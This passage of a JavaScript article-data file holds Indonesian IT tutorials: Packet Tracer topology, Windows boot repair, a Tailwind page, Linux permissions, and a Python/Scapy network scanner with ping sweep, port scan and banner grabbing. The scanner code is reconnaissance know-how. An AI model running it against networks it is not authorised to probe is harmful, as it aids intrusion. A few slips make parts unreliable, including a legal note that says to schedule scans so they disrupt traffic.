        "<li><strong>Enkripsi</strong> — <code>gpg</code>/<code>age</code> untuk data sensitif</li>" +
        "<li><strong>Jadwal cron</strong> — <code>crontab -e</code> dengan waktu di luar jam sibuk</li>" +
        "<li><strong>Uji restore</strong> — pulihkan ke mesin lain secara berkala</li>" +
        "</ul>" +
        callout(
          "tip",
          "Tantangan: tambahkan integrasi <strong>rclone</strong> agar arsip terenkripsi otomatis diunggah ke objek storage (S3/Backblaze) setiap selesai dibuat — mewujudkan komponen 'offsite' dari prinsip 3-2-1.",
          "LATIHAN"
        ),
    },

    "cisco-packet-tracer-topologi": {
      id: "cisco-packet-tracer-topologi",
      crumb: "Topologi Dasar Packet Tracer",
      title: "Membangun Topologi Jaringan Dasar dengan Cisco Packet Tracer",
      category: "networking",
      difficulty: "Beginner",
      excerpt:
        "Latihan hands-on: merancang topologi star topology, konfigurasi switch, static routing, dan verifikasi konektivitas end-to-end.",
      date: "2026-09-16",
      readTime: 11,
      lab: "Cisco Packet Tracer 8.x",
      author: "Admin KBHub",
      tags: ["cisco", "packet-tracer", "topology", "networking"],
      content:
        callout(
          "note",
          "Artikel ini fokus <strong>merancang &amp; memasang topologi</strong> (menaruh perangkat, menyambung kabel, IP statis, static routing). Untuk konfigurasi VLAN &amp; trunk, lanjut ke <a href='article.html?id=networking-cisco-vlan-routing' class='text-emerald-400 underline'>VLAN &amp; Inter-VLAN Routing</a>."
        ) +
        '<h2 id="ui">1. Mengenal Antarmuka Packet Tracer</h2>' +
        "<p>Packet Tracer dibagi tiga area utama: <strong>workspace</strong> (kanvas kosong), <strong>panel perangkat</strong> (kiri bawah), dan <strong>CLI/realtime</strong> (kanan bawah). Untuk memulai, pilih perangkat dari panel lalu klik di kanvas untuk menaruhnya.</p>" +
        '<table><thead><tr><th>Kategori</th><th>Perangkat Umum</th></tr></thead><tbody>' +
        "<tr><td>End Devices</td><td>PC, Laptop, Server, IP Phone</td></tr>" +
        "<tr><td>Network Devices</td><td>Switch (2960), Router (4321/2911)</td></tr>" +
        "<tr><td>Copper</td><td>Straight-through, Crossover, Console</td></tr>" +
        "<tr><td>WAN</td><td>Serial DCE/DTE, Fiber</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kabel">2. Memilih Kabel yang Tepat</h2>' +
        codeBlock(
          "bash",
          "# aturan cepat pemilihan kabel:\n# PC / Server  -> Switch     : Copper Straight-through\n# Switch       -> Switch     : Copper Crossover (atau auto-MDIX)\n# PC           -> Router     : Copper Straight-through\n# Router       -> Router     : Serial DCE/DTE (untuk WAN)\n# PC / Router  -> Console    : Console cable (konfigurasi awal)\n\n# tips: jika ragu di PT 8.x, pakai kabel bertanda 'automatically choose'"
        ) +
        callout(
          "warning",
          "Pada perangkat lama, menyambung PC ke PC memerlukan <strong>crossover</strong>, bukan straight-through. Salah memilih kabel membuat indikator link menyala oranye terus — tanda koneksi tidak established."
        ) +
        '<h2 id="star">3. Merancang Star Topology</h2>' +
        "<ol>" +
        "<li>Taruh <strong>1 switch</strong> sebagai pusat</li>" +
        "<li>Taruh 3 PC dan 1 Server di sekelilingnya</li>" +
        "<li>Sambung tiap PC/Server ke switch dengan straight-through</li>" +
        "<li>Pastikan semua indikator link berubah <strong>hijau</strong> (setelah menunggu STP)</li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# penomoran IP yang disarankan (switch tidak butuh IP)\nPC1   : 192.168.10.11/24   gw 192.168.10.1\nPC2   : 192.168.20.11/24   gw 192.168.20.1\nServer: 192.168.30.11/24   gw 192.168.30.1\n\n# di Packet Tracer: klik PC -> Desktop -> IP Configuration\n# isi IPv4 Address, Subnet Mask, Gateway"
        ) +
        '<h2 id="router">4. Menambah Router &amp; IP Antar-Interface</h2>' +
        codeBlock(
          "bash",
          "Router> enable\nRouter# configure terminal\n\n! interface menuju jaringan PC1\nRouter(config)# interface g0/0\nRouter(config-if)# ip address 192.168.10.1 255.255.255.0\nRouter(config-if)# no shutdown\nRouter(config-if)# exit\n\n! interface menuju jaringan PC2\nRouter(config)# interface g0/1\nRouter(config-if)# ip address 192.168.20.1 255.255.255.0\nRouter(config-if)# no shutdown\n\n! periksa\nRouter# show ip interface brief"
        ) +
        '<h2 id="static-route">5. Static Routing Antar Router</h2>' +
        "<p>Untuk menghubungkan dua jaringan lewat beberapa router, setiap router perlu tahu jalur menuju jaringan yang belum dikenalnya.</p>" +
        codeBlock(
          "bash",
          "# pada Router A, arahkan jaringan remote via Router B\nRouterA(config)# ip route 192.168.30.0 255.255.255.0 10.0.0.2\n#     sintaks: ip route  <network> <mask> <next-hop>\n\n# pada Router B, arahkan kembali ke jaringan PC1\nRouterB(config)# ip route 192.168.10.0 255.255.255.0 10.0.0.1\n\n# verifikasi tabel routing\nRouterA# show ip route\n# Gateway of last resort is not set\n# C  192.168.10.0/24 is directly connected, g0/0\n# S  192.168.30.0/24 [1/0] via 10.0.0.2"
        ) +
        callout(
          "note",
          "Kode <strong>S</strong> pada <code>show ip route</code> berarti statis, <strong>C</strong> berarti connected. Jika jalur remote tidak muncul dengan <code>S</code>, static routing belum terpasang atau IP next-hop salah."
        ) +
        '<h2 id="verifikasi">6. Verifikasi Konektivitas</h2>' +
        codeBlock(
          "bash",
          "# tes dari PC1 ke PC2 (beda jaringan, lewat router)\nC:\\> ping 192.168.20.11\n# Reply from 192.168.20.11: bytes=32 time=2ms TTL=126\n\n# tes ke server\nC:\\> ping 192.168.30.11\n\n# periksa jalur bila gagal\nC:\\> tracert 192.168.30.11\n# 1  192.168.10.1   (gateway)\n# 2  10.0.0.2       (router antar)\n# 3  192.168.30.11  (tujuan)"
        ) +
        '<h2 id="simulation">7. Mode Simulation</h2>' +
        "<p>Selain <strong>Realtime</strong>, Packet Tracer punya mode <strong>Simulation</strong> yang memeriksa paket satu per satu — sangat berguna untuk melihat alur ICMP/HTTP dan menemukan titik gagal.</p>" +
        "<ul>" +
        "<li>Klik tab <em>Simulation</em> di kanan bawah</li>" +
        "<li>Pilih protokol yang ingin diamati (ICMP, DNS, TCP)</li>" +
        "<li>Tekan <em>Capture / Forward</em> untuk melihat paket bergerak antar perangkat</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pola dasar membangun jaringan di Packet Tracer selalu mengikuti urutan: <strong>taruh perangkat → sambung kabel → beri IP → tambah route → verifikasi</strong>. Kuasai alur ini lebih dulu sebelum masuk ke konfigurasi lanjutan seperti VLAN atau dynamic routing.</p>" +
        callout(
          "tip",
          "Simpan proyek dengan <code>.pkt</code> secara berkala. Gunakan mode <em>Realtime</em> untuk uji cepat, lalu <em>Simulation</em> ketika perlu mendiagnosa mengapa paket tidak sampai.",
          "TIPS"
        ),
    },

    "troubleshooting-pc-tidak-booting": {
      id: "troubleshooting-pc-tidak-booting",
      crumb: "Troubleshooting PC Tidak Booting",
      title: "Troubleshooting: PC Tidak Booting ke Windows",
      category: "itsupport",
      difficulty: "Beginner",
      excerpt:
        "Alur diagnostik sistematis dari LED indikator, POST beep code, hingga perbaikan MBR dan repair startup menggunakan Windows Recovery.",
      date: "2026-09-13",
      readTime: 13,
      lab: "PC Desktop / Laptop Windows 10/11",
      author: "Admin KBHub",
      tags: ["troubleshooting", "windows", "hardware", "boot"],
      content:
        callout(
          "note",
          "Artikel ini menangani <strong>level OS/bootloader</strong> — mesin menyala tapi Windows tidak mau masuk. Untuk masalah hardware murni (RAM tidak terbaca, layar hitam total, overheat), baca <a href='article.html?id=itsupport-pc-troubleshooting' class='text-emerald-400 underline'>Troubleshooting Hardware PC</a>."
        ) +
        '<h2 id="klasifikasi">1. Klasifikasi Gejala</h2>' +
        '<table><thead><tr><th>Gejala</th><th>Kemungkinan</th></tr></thead><tbody>' +
        "<tr><td>Mati total, LED padam</td><td>PSU, kabel power, motherboard</td></tr>" +
        "<tr><td>LED menyala, kipas jalan, layar hitam</td><td>RAM, GPU, koneksi monitor</td></tr>" +
        "<tr><td>Muncul logo lalu berhenti</td><td>Bootloader, disk, driver</td></tr>" +
        "<tr><td>Blue Screen (BSOD)</td><td>Driver, RAM, sistem file rusak</td></tr>" +
        "<tr><td>Tampil <em>No bootable device</em></td><td>Boot order, disk terdeteksi?</td></tr>" +
        "</tbody></table>" +
        '<h2 id="led-post">2. Cek LED &amp; POST Beep</h2>' +
        codeBlock(
          "bash",
          "# amankan sebelum lanjut:\n#   - catat kode error di layar (mis. 0xc000000f)\n#   - dengarkan pola beep saat power on\n#   - periksa LED motherboard (EZ Debug / Diagnostic)\n\n# pola beep umum (AMI BIOS):\n#   1 beep pendek      = POST sukses\n#   1 panjang + 2 pendek = masalah DRAM\n#   1 panjang terus    = masalah PSU/GPU"
        ) +
        '<h2 id="boot-order">3. Periksa Boot Order &amp; Deteksi Disk</h2>' +
        codeBlock(
          "bash",
          "# masuk BIOS/UEFI (F2/F12/DEL saat boot)\n#   1. pastikan hard disk/SSD terdeteksi di Storage\n#   2. atur Boot Priority: Windows Boot Manager / SSD di atas\n#   3. jika disk tidak terdeteksi -> masalah kabel/SATA/M.2\n\n# cek cepat: lepas & pasang kabel data & power disk\n# ganti kabel SATA / coba slot M.2 lain"
        ) +
        '<h2 id="winre">4. Masuk Windows Recovery (WinRE)</h2>' +
        "<p>Jika Windows gagal boot 3 kali berturut-turut, sistem otomatis masuk <strong>Automatic Repair</strong>. Kamu juga bisa memicunya manual:</p>" +
        codeBlock(
          "bash",
          "# cara memaksa masuk WinRE:\n#   1. tahan tombol Power 10 dtk hingga mati, ulangi 3x\n#   2. atau dari instalasi USB: 'Repair your computer'\n\n# setelah masuk, pilih:\n#   Troubleshoot -> Advanced options\n#   -> Startup Repair / Command Prompt / System Restore"
        ) +
        '<h2 id="repair">5. Perbaikan MBR &amp; BCD</h2>' +
        "<p>Seringkas ini, jalankan di <em>Command Prompt</em> dari WinRE (asumsi Windows di <code>C:</code>, disk di <code>disk0</code>):</p>" +
        codeBlock(
          "bash",
          "# aktifkan partisi Windows (lihat Diskpart)\ndiskpart\n  list disk\n  select disk 0\n  list volume        # cari volume EFI (100-260MB) & Windows\n  select volume N\n  assign letter=Z    # untuk partisi EFI\n  exit\n\n# perbaiki MBR, PBR, dan boot record\nbootrec /fixmbr\nbootrec /fixboot\nbootrec /rebuildbcd\n\n# untuk partisi EFI: re-registrasi Windows Boot Manager\nbcdboot C:\\\\Windows /s Z: /f UEFI"
        ) +
        callout(
          "warning",
          "Perintah <code>bootrec /fixboot</code> kadang berbunyi <em>Access is denied</em>. Solusinya: jalankan <code>bootrec /fixmbr</code> dulu, atau gunakan <code>diskpart</code> untuk menandai partisi EFI aktif sebelum mengulang."
        ) +
        '<h2 id="startup">6. Startup Repair &amp; System Restore</h2>' +
        codeBlock(
          "bash",
          "# dari WinRE -> Advanced options\n#   Startup Repair : perbaikan otomatis masalah umum boot\n#   System Restore : kembalikan ke titik restore sebelum error\n#   Uninstall Updates: bila muncul setelah update Windows\n#   Safe Mode      : boot minimal untuk diagnosa driver"
        ) +
        "<p>Masuk <strong>Safe Mode</strong> bila mencurigai driver baru. Di Safe Mode, Windows hanya memuat driver dasar sehingga driver bermasalah tidak ikut berjalan.</p>" +
        '<h2 id="disk">7. Periksa Integritas Disk &amp; Sistem</h2>' +
        codeBlock(
          "bash",
          "# dari Command Prompt WinRE (partisi Windows biasanya D: di WinRE)\nchkdsk D: /f /r\n\n# periksa & pulihkan sistem file\nsfc /scannow /offbootdir=D:\\\\ /offwindir=D:\\\\Windows\n\ndism /image:D:\\\\ /cleanup-image /restorehealth"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Urutan diagnostik yang efektif: <strong>LED/beep (hardware) → deteksi disk → boot order → WinRE → perbaikan MBR/BCD → disk &amp; sistem file</strong>. Dengan urutan ini, kamu mengeliminasi kemungkinan dari yang paling sederhana ke paling rumit tanpa asal tebak.</p>" +
        "<p>Alat penyelamat yang sebaiknya selalu siap:</p>" +
        "<ul>" +
        "<li><strong>Bootable USB Windows</strong> — untuk <em>Startup Repair</em> dan <em>Command Prompt</em></li>" +
        "<li><strong>Live USB Linux</strong> — memindahkan data bila Windows tidak bisa masuk sama sekali</li>" +
        "<li><strong>Cable tester / SSD eksternal</strong> — menguji disk lama secara terpisah</li>" +
        "<li><strong>Catatan kode beep/LED</strong> — mempercepat identifikasi masalah hardware</li>" +
        "</ul>" +
        callout(
          "tip",
          "Buat <strong>bootable USB Windows</strong> dan simpan sebagai persiapan. USB ini bukan hanya untuk instalasi ulang, tapi juga sumber <em>Repair your computer</em> saat sistem tidak mau menyala sama sekali.",
          "TIPS"
        ),
    },

    "tailwind-landing-page": {
      id: "tailwind-landing-page",
      crumb: "Build Landing Page Tailwind",
      title: "Membangun Landing Page Responsif dengan Tailwind CSS",
      category: "webdev",
      difficulty: "Beginner",
      excerpt:
        "Praktik front-end modern: komponen hero, pricing card, dan dark mode — semuanya tanpa framework berat, hanya HTML + Tailwind CDN.",
      date: "2026-09-10",
      readTime: 10,
      lab: "VS Code + Browser Modern",
      author: "Admin KBHub",
      tags: ["tailwind", "css", "html", "responsive"],
      content:
        callout(
          "note",
          "Artikel ini adalah <strong>build-along project</strong> — kita susun landing page lengkap dari nol (navbar, hero, fitur, pricing, footer) plus toggle dark mode. Untuk penjelasan konsep breakpoint &amp; utility per item, baca <a href='article.html?id=webdev-tailwind-responsive' class='text-emerald-400 underline'>Landing Page Responsive dengan Tailwind</a>."
        ) +
        '<h2 id="struktur">1. Kerangka Halaman</h2>' +
        codeBlock(
          "html",
          "<!DOCTYPE html>\n<html lang=\"id\" class=\"scroll-smooth\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Nimbus - Landing Page</title>\n  <script src=\"https://cdn.tailwindcss.com\"></script>\n  <script>\n    tailwind.config = { darkMode: 'class' }\n  </script>\n</head>\n<body class=\"bg-white text-slate-900 dark:bg-slate-950 dark:text-slate-100\">\n  <!-- konten -->\n</body>\n</html>"
        ) +
        callout(
          "tip",
          "Konfigurasi <code>darkMode: 'class'</code> membuat tema gelap dikendalikan lewat class <code>dark</code> pada <code>&lt;html&gt;</code> — inilah yang memungkinkan toggle dark mode lewat JavaScript."
        ) +
        '<h2 id="navbar">2. Navbar</h2>' +
        codeBlock(
          "html",
          "<header class=\"sticky top-0 z-50 border-b border-slate-200 bg-white/80 backdrop-blur dark:border-slate-800 dark:bg-slate-950/80\">\n  <nav class=\"mx-auto flex max-w-6xl items-center justify-between px-4 py-3\">\n    <span class=\"text-xl font-bold\">Nimbus<span class=\"text-emerald-500\">.</span></span>\n    <div class=\"hidden gap-6 text-sm md:flex\">\n      <a href=\"#fitur\" class=\"hover:text-emerald-500\">Fitur</a>\n      <a href=\"#harga\" class=\"hover:text-emerald-500\">Harga</a>\n      <a href=\"#faq\" class=\"hover:text-emerald-500\">FAQ</a>\n    </div>\n    <button id=\"theme-toggle\" class=\"rounded-lg border px-3 py-1 text-sm dark:border-slate-700\">\n      🌙\n    </button>\n  </nav>\n</header>"
        ) +
        '<h2 id="hero">3. Hero Section</h2>' +
        codeBlock(
          "html",
          "<section class=\"mx-auto max-w-4xl px-4 py-24 text-center\">\n  <span class=\"rounded-full bg-emerald-500/10 px-4 py-1 text-sm text-emerald-600 dark:text-emerald-400\">\n    Sudah dipakai 12.000+ developer\n  </span>\n  <h1 class=\"mt-6 text-4xl font-extrabold leading-tight md:text-6xl\">\n    Bangun Antarmuka<br>Lebih Cepat\n  </h1>\n  <p class=\"mx-auto mt-4 max-w-xl text-slate-600 dark:text-slate-400\">\n    Tailwind CSS memungkinkanmu menulis CSS langsung di HTML — tanpa file CSS terpisah.\n  </p>\n  <div class=\"mt-8 flex justify-center gap-3\">\n    <a href=\"#harga\" class=\"rounded-xl bg-emerald-500 px-6 py-3 font-semibold hover:bg-emerald-400\">Mulai Gratis</a>\n    <a href=\"#fitur\" class=\"rounded-xl border px-6 py-3 hover:border-emerald-500\">Pelajari Fitur</a>\n  </div>\n</section>"
        ) +
        '<h2 id="fitur">4. Grid Fitur</h2>' +
        codeBlock(
          "html",
          "<section id=\"fitur\" class=\"mx-auto max-w-6xl px-4 py-16\">\n  <h2 class=\"text-center text-3xl font-bold\">Fitur Unggulan</h2>\n  <div class=\"mt-10 grid gap-6 sm:grid-cols-2 lg:grid-cols-3\">\n    <!-- kartu fitur -->\n    <div class=\"rounded-2xl border p-6 dark:border-slate-800\">\n      <div class=\"text-3xl\">⚡</div>\n      <h3 class=\"mt-4 font-semibold\">Ultra Ringan</h3>\n      <p class=\"mt-2 text-sm text-slate-600 dark:text-slate-400\">\n        Hanya CSS yang dipakai yang di-compile.\n      </p>\n    </div>\n    <!-- duplikat kartu di atas untuk item lain -->\n  </div>\n</section>"
        ) +
        '<h2 id="pricing">5. Pricing Card</h2>' +
        codeBlock(
          "html",
          "<section id=\"harga\" class=\"mx-auto max-w-6xl px-4 py-16\">\n  <div class=\"grid gap-6 md:grid-cols-3\">\n    <div class=\"rounded-2xl border p-8 dark:border-slate-800\">\n      <h3 class=\"font-semibold\">Starter</h3>\n      <p class=\"mt-2 text-4xl font-extrabold\">Rp0<span class=\"text-base font-normal text-slate-500\">/bln</span></p>\n      <ul class=\"mt-6 space-y-2 text-sm text-slate-600 dark:text-slate-400\">\n        <li>✔ 1 project</li><li>✔ Komunitas</li>\n      </ul>\n      <button class=\"mt-6 w-full rounded-xl border py-3\">Pilih</button>\n    </div>\n    <!-- kartu Pro: sorot dengan ring & badge -->\n    <div class=\"relative rounded-2xl border-2 border-emerald-500 p-8\">\n      <span class=\"absolute -top-3 right-4 rounded-full bg-emerald-500 px-3 py-1 text-xs\">Populer</span>\n      <h3 class=\"font-semibold\">Pro</h3>\n      <p class=\"mt-2 text-4xl font-extrabold\">Rp99rb<span class=\"text-base font-normal\">/bln</span></p>\n      <button class=\"mt-6 w-full rounded-xl bg-emerald-500 py-3 font-semibold\">Pilih Pro</button>\n    </div>\n  </div>\n</section>"
        ) +
        '<h2 id="footer">6. Footer</h2>' +
        codeBlock(
          "html",
          "<footer class=\"border-t border-slate-200 dark:border-slate-800\">\n  <div class=\"mx-auto flex max-w-6xl flex-col items-center justify-between gap-4 px-4 py-8 md:flex-row\">\n    <p class=\"text-sm text-slate-500\">© 2026 Nimbus. Semua hak dilindungi.</p>\n    <div class=\"flex gap-5 text-sm\">\n      <a href=\"#\" class=\"hover:text-emerald-500\">Twitter</a>\n      <a href=\"#\" class=\"hover:text-emerald-500\">GitHub</a>\n      <a href=\"#\" class=\"hover:text-emerald-500\">Discord</a>\n    </div>\n  </div>\n</footer>"
        ) +
        '<h2 id="darkmode">7. Toggle Dark Mode</h2>' +
        codeBlock(
          "javascript",
          "const toggle = document.getElementById('theme-toggle');\nconst html = document.documentElement;\n\n// muat preferensi tersimpan\nif (localStorage.theme === 'dark') {\n  html.classList.add('dark');\n}\n\ntoggle.addEventListener('click', () => {\n  html.classList.toggle('dark');\n  // simpan preferensi\n  localStorage.theme = html.classList.contains('dark') ? 'dark' : 'light';\n  toggle.textContent = html.classList.contains('dark') ? '☀️' : '🌙';\n});"
        ) +
        '<h2 id="checklist">8. Checklist Sebelum Publish</h2>' +
        "<ul>" +
        "<li>Uji di <strong>3 lebar layar</strong>: 360px (ponsel), 768px (tablet), 1280px (desktop)</li>" +
        "<li>Pastikan kontras teks latar memadai (terutama mode gelap)</li>" +
        "<li>Periksa area sentuh tombol minimal ~44px di mobile</li>" +
        "<li>Tambahkan <code>loading=\"lazy\"</code> pada gambar non-kritis</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Dengan utility class dan satu toggle <code>dark</code>, kita menghasilkan landing page modern yang lengkap dan responsif tanpa satu baris CSS pun di file terpisah. Pola <strong>konfigurasi darkMode class</strong> ini juga berlaku sama di proyek produksi yang memakai build tool.</p>",
    },

    "python-automation-network-scan": {
      id: "python-automation-network-scan",
      crumb: "Automasi Network Scan Python",
      title: "Automasi Network Scan dengan Python & Scapy",
      category: "webdev",
      difficulty: "Advanced",
      excerpt:
        "Tulis tool pemindai jaringan ringan berbasis Python untuk ping sweep dan port discovery, lengkap dengan output terformat.",
      date: "2026-09-04",
      readTime: 17,
      lab: "Python 3.11 + Scapy",
      author: "Admin KBHub",
      tags: ["python", "scapy", "automation", "security"],
      content:
        callout(
          "warning",
          "Gunakan tool ini <strong>hanya pada jaringan yang menjadi milikmu atau yang terautorasi</strong>. Memindai jaringan orang lain tanpa izin melanggar hukum dan kebijakan privasi.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="konsep">1. Konsep Ping Sweep &amp; Port Scan</h2>' +
        "<p><strong>Ping sweep</strong> mendeteksi host hidup di satu rentang IP. <strong>Port discovery</strong> memeriksa port mana yang terbuka pada host tersebut. Keduanya adalah dasar pembuat aset inventaris jaringan otomatis.</p>" +
        codeBlock(
          "bash",
          "# instal scapy (butuh hak admin untuk kirim paket mentah)\npip install scapy\n\n# di Linux, jalankan script dengan sudo\nsudo python3 scan.py"
        ) +
        '<h2 id="scapy">2. Ping Sweep dengan Scapy</h2>' +
        codeBlock(
          "python",
          "from scapy.all import IP, ICMP, sr1, conf\nconf.verb = 0   # kurangi output verbose\n\ndef ping_sweep(network: str) -> list[str]:\n    \"\"\"Kirim ICMP echo ke tiap host, kembalikan yang hidup.\"\"\"\n    alive = []\n    for i in range(1, 255):\n        target = f\"{network}.{i}\"\n        pkt = IP(dst=target) / ICMP()\n        reply = sr1(pkt, timeout=0.5, verbose=0)\n        if reply is not None:\n            alive.append(target)\n            print(f\"[+] {target} HIDUP\")\n    return alive\n\nhosts = ping_sweep(\"192.168.1\")\nprint(f\"Total host hidup: {len(hosts)}\")"
        ) +
        callout(
          "note",
          "Timeout <code>0.5</code> detik adalah keseimbangan umum. Nilai terlalu kecil membuat host lambat terlewat; terlalu besar membuat pemindaian menjadi lambat. Untuk jaringan besar, pertimbangkan <strong>pemindaian bertepatan (threading)</strong>."
        ) +
        '<h2 id="threading">3. Mempercepat dengan Thread Pool</h2>' +
        codeBlock(
          "python",
          "from concurrent.futures import ThreadPoolExecutor\n\ndef ping_one(target: str) -> str | None:\n    reply = sr1(IP(dst=target) / ICMP(), timeout=0.4, verbose=0)\n    return target if reply else None\n\ndef fast_sweep(network: str, workers: int = 64) -> list[str]:\n    targets = [f\"{network}.{i}\" for i in range(1, 255)]\n    with ThreadPoolExecutor(max_workers=workers) as ex:\n        results = ex.map(ping_one, targets)\n    return [r for r in results if r]\n\nprint(fast_sweep(\"192.168.1\"))"
        ) +
        '<h2 id="portscan">4. Port Discovery (TCP Connect)</h2>' +
        "<p>Untuk scan port, gunakan socket standar Python — lebih portabel daripada paket mentah bila tidak butuh nmap-style raw scan.</p>" +
        codeBlock(
          "python",
          "import socket\nfrom concurrent.futures import ThreadPoolExecutor\n\nCOMMON = [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]\n\ndef check_port(host: str, port: int, timeout: float = 0.6) -> int | None:\n    try:\n        with socket.create_connection((host, port), timeout=timeout):\n            return port\n    except (socket.timeout, ConnectionRefusedError, OSError):\n        return None\n\ndef scan_ports(host: str, ports=COMMON) -> list[int]:\n    with ThreadPoolExecutor(max_workers=100) as ex:\n        results = ex.map(lambda p: check_port(host, p), ports)\n    return [p for p in results if p]\n\nfor host in [\"192.168.1.10\"]:\n    open_ports = scan_ports(host)\n    print(f\"{host}: {open_ports if open_ports else 'tidak ada port terbuka'}\")"
        ) +
        '<h2 id="banner">5. Grab Banner &amp; Identifikasi Layanan</h2>' +
        codeBlock(
          "python",
          "def grab_banner(host: str, port: int) -> str:\n    try:\n        with socket.create_connection((host, port), timeout=1) as s:\n            s.settimeout(1)\n            banner = s.recv(1024).decode(errors='ignore').strip()\n            return banner\n    except Exception as e:\n        return f\"(tidak ada banner: {e})\"\n\nprint(grab_banner('192.168.1.10', 22))\n# contoh output: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
        ) +
        '<h2 id="output">6. Output Terformat &amp; Ekspor</h2>' +
        codeBlock(
          "python",
          "import csv, json\nfrom datetime import datetime\n\ndef report(hosts: list[dict], path='scan-report'):\n    # simpan JSON\n    with open(f'{path}.json', 'w') as f:\n        json.dump({\n            'scanned_at': datetime.now().isoformat(),\n            'total_hosts': len(hosts),\n            'hosts': hosts,\n        }, f, indent=2)\n\n    # simpan CSV ringkas\n    with open(f'{path}.csv', 'w', newline='') as f:\n        w = csv.writer(f)\n        w.writerow(['ip', 'status', 'open_ports'])\n        for h in hosts:\n            w.writerow([h['ip'], h['status'], ','.join(map(str, h['ports']))])\n\nreport([\n    {'ip': '192.168.1.10', 'status': 'up', 'ports': [22, 80]},\n    {'ip': '192.168.1.11', 'status': 'down', 'ports': []},\n])"
        ) +
        '<h2 id="cli">7. Membungkus sebagai CLI</h2>' +
        codeBlock(
          "python",
          "import argparse\n\ndef main():\n    p = argparse.ArgumentParser(description='Network scanner ringan')\n    p.add_argument('-n', '--network', required=True,\n                   help='contoh: 192.168.1 untuk rentang .1-.254')\n    p.add_argument('-p', '--ports', nargs='*', type=int, default=COMMON)\n    args = p.parse_args()\n\n    hosts = fast_sweep(args.network)\n    results = [{'ip': h, 'status': 'up', 'ports': scan_ports(h, args.ports)}\n               for h in hosts]\n    report(results)\n    print('Selesai. Lihat scan-report.json / .csv')\n\nif __name__ == '__main__':\n    main()\n\n# pemakaian:\n# sudo python3 scan.py -n 192.168.1 -p 22 80 443"
        ) +
        '<h2 id="legal">8. Catatan Hukum &amp; Etika</h2>' +
        "<ul>" +
        "<li>Pindai <strong>hanya</strong> milik sendiri atau dengan izin tertulis</li>" +
        "<li>Hindari scan jaringan kantor/orang tanpa otorisasi tertulis</li>" +
        "<li>Di lingkungan produksi, koordinasikan jadwal agar mengganggu trafik</li>" +
        "<li>Data hasil scan bisa sensitif — jangan bagikan sembarangan</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Dengan <strong>Scapy</strong> untuk ping sweep dan <strong>socket + thread pool</strong> untuk port discovery, kamu bisa membangun tool inventaris jaringan sendiri yang ringan dan bisa dikustomisasi penuh — modal awal yang baik sebelum memakai framework keamanan yang lebih besar.</p>" +
        callout(
          "tip",
          "Kembangkan lagi: tambahkan deteksi OS via TTL, ekspor ke database SQLite, atau integrasikan dengan <strong>Nmap</strong> via <code>python-nmap</code> untuk fitur scan lanjutan.",
          "TIPS"
        ),
    },

    "linux-permissions-umask": {
      id: "linux-permissions-umask",
      crumb: "Permissions, umask & Special Bits",
      title: "Memahami Linux Permissions, umask & Special Bits (Sticky, SGID)",
      category: "linux",
      difficulty: "Intermediate",
      excerpt:
        "Penjelasan mendalam model permission Unix, perhitungan umask default, serta penerapan sticky bit pada direktori bersama.",
      date: "2026-09-01",
      readTime: 11,
      lab: "Ubuntu 22.04 / CentOS (Terminal)",
      author: "Admin KBHub",
      tags: ["linux", "permissions", "umask", "sysadmin"],
      content:
        callout(
          "note",
          "Artikel ini menjelaskan <strong>permission dari sisi admin</strong> (memahami &amp; mengelola). Untuk sisi keamanan mengeksploitasi permission guna eskalasi privilegi, baca <a href='article.html?id=linux-suid-privesc' class='text-emerald-400 underline'>Linux Privilege Escalation via SUID</a>."
        ) +
        '<h2 id="model">1. Model Permission Unix</h2>' +
        "<p>Setiap file punya tiga bit izin per identitas: <strong>owner (u)</strong>, <strong>group (g)</strong>, dan <strong>other (o)</strong> — masing-masing <code>r</code> (baca), <code>w</code> (tulis), <code>x</code> (eksekusi).</p>" +
        codeBlock(
          "bash",
          "# membaca output ls -l\n-rw-r--r--  1 owner group  1234 Jan 1 10:00 file.txt\n^  ^  ^  ^\n|  |  |  other (r--)\n|  |  group (r--)\n|  owner (rw-)\ntipe: - = file, d = direktori\n\n# arti bit untuk direktori:\n#   r = boleh lihat isi (ls)\n#   w = boleh tambah/hapus file di dalamnya\n#   x = boleh masuk (cd)"
        ) +
        '<h2 id="chmod">2. chmod: Notasi Oktal vs Simbolis</h2>' +
        codeBlock(
          "bash",
          "# ---- notasi oktal (angka) ----\n# r=4, w=2, x=1 ; jumlah per kelompok\nchmod 644 file.txt     # owner rw-, group r--, other r--\nchmod 755 script.sh    # owner rwx, group rx, other rx\nchmod 600 secret.key   # owner rw-, group ---, other ---\n\n# ---- notasi simbolis ----\nchmod u+x script.sh    # tambah eksekusi untuk owner\nchmod go-w file.txt    # hapus tulis untuk group & other\nchmod a=rX file        # semua boleh baca, tambah x hanya bila direktori/eksekusi\n\n# rekursif\nchmod -R 755 /var/www"
        ) +
        callout(
          "tip",
          "Notasi <code>a=rX</code> (X kapital) berguna: hanya menambahkan bit eksekusi bila target adalah direktori atau memang sudah punya x — lebih aman daripada <code>a=rx</code> yang memaksa x ke semua file."
        ) +
        '<h2 id="chown">3. chown &amp; chgrp</h2>' +
        codeBlock(
          "bash",
          "# ubah pemilik\sudo chown alice:developers file.txt\n\n# ubah grup saja\nsudo chgrp marketing report.csv\n\n# rekursif (wajib untuk direktori web)\nsudo chown -R www-data:www-data /var/www/html"
        ) +
        '<h2 id="umask">4. umask: Izin Default File Baru</h2>' +
        "<p><strong>umask</strong> adalah 'topeng' yang membatasi izin maksimal saat file/direktori baru dibuat. Ia <strong>mengurangi</strong>, bukan menambah.</p>" +
        codeBlock(
          "bash",
